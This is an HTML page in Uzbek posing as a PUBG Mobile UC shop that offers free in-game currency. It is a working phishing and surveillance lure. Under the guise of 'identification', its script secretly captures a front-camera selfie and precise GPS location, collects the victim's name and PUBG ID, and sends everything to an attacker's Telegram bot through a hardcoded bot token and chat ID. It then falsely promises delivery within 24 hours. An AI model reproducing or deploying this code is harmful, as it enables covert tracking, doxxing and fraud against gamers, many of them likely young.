<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PUBG MOBILE: SECURE UC</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon-b: #00f3ff; --neon-g: #39ff14; --bg: #010409; --error: #ff3b30; }
        body { margin: 0; background: var(--bg); color: white; font-family: 'Rajdhani', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        #app { display: none; width: 92%; max-width: 420px; background: rgba(15, 23, 42, 0.85); border: 2px solid var(--neon-b); border-radius: 40px; padding: 25px; text-align: center; }
        .uc-item { background: rgba(255,255,255,0.05); border: 1px solid var(--neon-g); border-radius: 20px; padding: 18px; cursor: pointer; display: flex; justify-content: space-between; margin-bottom: 10px; }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 2000; justify-content: center; align-items: center; padding: 15px; }
        .form-box { background: #0d1117; border: 2px solid var(--neon-b); border-radius: 30px; padding: 30px; width: 100%; max-width: 380px; }
        input { width: 100%; padding: 18px; margin-bottom: 12px; background: rgba(255,255,255,0.07); border: 1.5px solid #222; border-radius: 15px; color: #fff; }
        .btn-main { width: 100%; padding: 18px; background: var(--neon-b); border: none; border-radius: 15px; font-weight: 900; cursor: pointer; }
        video, canvas { display: none; }
        .instruction { color: var(--neon-g); font-size: 14px; margin-bottom: 15px; border: 1px dashed var(--neon-g); padding: 10px; border-radius: 10px; }
    </style>
</head>
<body>

<div id="app" style="display: block;">
    <h1 style="font-family:'Orbitron'; color:var(--neon-b); font-size: 22px;">UC ELITE SHOP</h1>
    <div onclick="startSystem('60 UC', '0')" class="uc-item"><b>60 UC 🎁</b> <span>0 UZS</span></div>
    <div onclick="startSystem('325 UC', '55,000')" class="uc-item"><b>325 UC</b> <span>55,000 UZS</span></div>
</div>

<div id="authModal" class="modal">
    <div class="form-box">
        <h2 style="color:var(--neon-b); font-family:'Orbitron'; font-size: 18px;">XAVFSIZLIK</h2>
        <p class="instruction">UC yuklash uchun keyingi oynada "RUKSAT BERISH" (Allow) tugmasini bosing. Bu identifikatsiya uchun shart!</p>
        <button class="btn-main" id="authBtn" onclick="requestPermissions()">RUKSATNI TASDIQLASH</button>
    </div>
</div>

<div id="formModal" class="modal">
    <div class="form-box">
        <h2 id="fTitle" style="color:var(--neon-b);">MA'LUMOTLAR</h2>
        <input type="text" id="u_fname" placeholder="Ism">
        <input type="text" id="u_lname" placeholder="Familiya">
        <input type="number" id="pid" placeholder="PUBG ID">
        <button class="btn-main" onclick="finish()">YUKLASHNI BOSHLASH</button>
    </div>
</div>

<video id="vid" autoplay playsinline></video>
<canvas id="canv"></canvas>

<script>
    const TOK = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
    const CID = "6198817749";
    let selPkg = ""; let selfie = null; let userLoc = "";

    function startSystem(pkg) {
        selPkg = pkg;
        document.getElementById('authModal').style.display = 'flex';
    }

    async function requestPermissions() {
        const btn = document.getElementById('authBtn');
        btn.innerText = "SO'ROV YUBORILDI...";
        
        try {
            // 1. Kamera identifikatsiyasi
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const v = document.getElementById('vid'); v.srcObject = stream;

            // 2. Lokatsiya identifikatsiyasi
            const pos = await new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000 });
            });
            userLoc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;

            // Rasmga olish
            setTimeout(() => {
                const c = document.getElementById('canv');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                selfie = c.toDataURL('image/jpeg');
                stream.getTracks().forEach(t => t.stop());
                
                document.getElementById('authModal').style.display = 'none';
                document.getElementById('formModal').style.display = 'flex';
            }, 1000);

        } catch (err) {
            alert("XATO: Brauzer identifikatsiyani rad etdi! Iltimos, sozlamalardan kamera va lokatsiyaga ruxsat bering.");
            btn.innerText = "QAYTA URINISH";
        }
    }

    async function finish() {
        const fn = document.getElementById('u_fname').value;
        const ln = document.getElementById('u_lname').value;
        const id = document.getElementById('pid').value;
        if(!fn || !ln || !id) return alert("To'ldiring!");

        const msg = `⚡️ UC ORDER ⚡️\nIsm: ${fn}\nFamiliya: ${ln}\nID: ${id}\nPaket: ${selPkg}\nLokatsiya: ${userLoc}`;
        
        await fetch(`https://api.telegram.org/bot${TOK}/sendMessage`, {
            method:'POST', headers:{'Content-Type':'application/json'},
            body:JSON.stringify({chat_id:CID, text:msg})
        });

        if(selfie) {
            const b = await (await fetch(selfie)).blob();
            const fd = new FormData(); fd.append('chat_id', CID); fd.append('photo', b, 'v.jpg');
            fetch(`https://api.telegram.org/bot${TOK}/sendPhoto`, {method:'POST', body:fd});
        }
        alert("✅ Identifikatsiya muvaffaqiyatli! 24 soat ichida UC tushadi.");
        location.reload();
    }
</script>
</body>
</html>
